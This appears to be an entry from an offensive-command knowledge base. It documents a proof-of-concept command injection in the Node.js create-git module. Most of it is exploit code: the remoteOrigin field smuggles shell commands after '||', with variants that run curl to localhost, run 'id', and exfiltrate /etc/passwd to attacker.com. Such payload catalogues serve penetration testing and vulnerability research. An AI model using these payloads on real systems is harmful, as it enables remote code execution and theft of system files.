---
id: cmd-node-poc-create-git
data: >-
  const createGit = require('create-git');
  createGit({ignoreExisting:true,initialCommitMessage:'test',remoteOrigin:'http://evil.com
  || curl "http://localhost/RCE"',ignoreTemplates:['Node.gitignore']})
tags:
  - rce
  - poc
  - injection
type: command
output: >-
  Git repository created with initial commit; injected curl command executed
  (e.g., HTTP request to localhost/RCE)
executor: node
platforms:
  - Node.js
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:19.633Z'
verified: false
validated: true
submitted: true
---
# node-poc-create-git-injection

## Command

```javascript
const createGit = require('create-git');
createGit({
  ignoreExisting: true,
  initialCommitMessage: 'test',
  remoteOrigin: 'http://evil.com || curl "http://localhost/RCE"',
  ignoreTemplates: ['Node.gitignore']
});
```

## Description

This Node.js command serves as a proof-of-concept (PoC) to exploit command injection in the create-git module by requiring it and invoking createGit with a malicious remoteOrigin payload that chains an arbitrary shell command using '||'. It demonstrates RCE by executing the injected curl alongside legitimate Git operations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ignoreExisting | Boolean to skip if repo exists (true) | No |
| initialCommitMessage | String for the initial commit message ('test') | No |
| remoteOrigin | Malicious URL with injection payload (e.g., 'http://evil.com \|\| curl "http://localhost/RCE"') | Yes |
| ignoreTemplates | Array of templates to ignore (['Node.gitignore']) | No |

## Examples

### Basic Usage

```javascript
const createGit = require('create-git');
createGit({ remoteOrigin: 'http://evil.com || id' });
```

### Advanced Usage

```javascript
const createGit = require('create-git');
createGit({
  ignoreExisting: true,
  initialCommitMessage: 'Initial exploit commit',
  remoteOrigin: 'http://evil.com || curl -d @/etc/passwd http://attacker.com/exfil',
  ignoreTemplates: ['all']
});
```

## Expected Output

Console output shows Git commands executing (e.g., 'Initialized empty Git repository', 'remote origin added'), followed by the injected command's output (e.g., curl response or error if endpoint missing). Successful RCE is indicated by the secondary command running post-Git setup.

## Related

- [[procedures/Exploit-Command-Injection-in-create-git]]
- [[tools/create-git]]
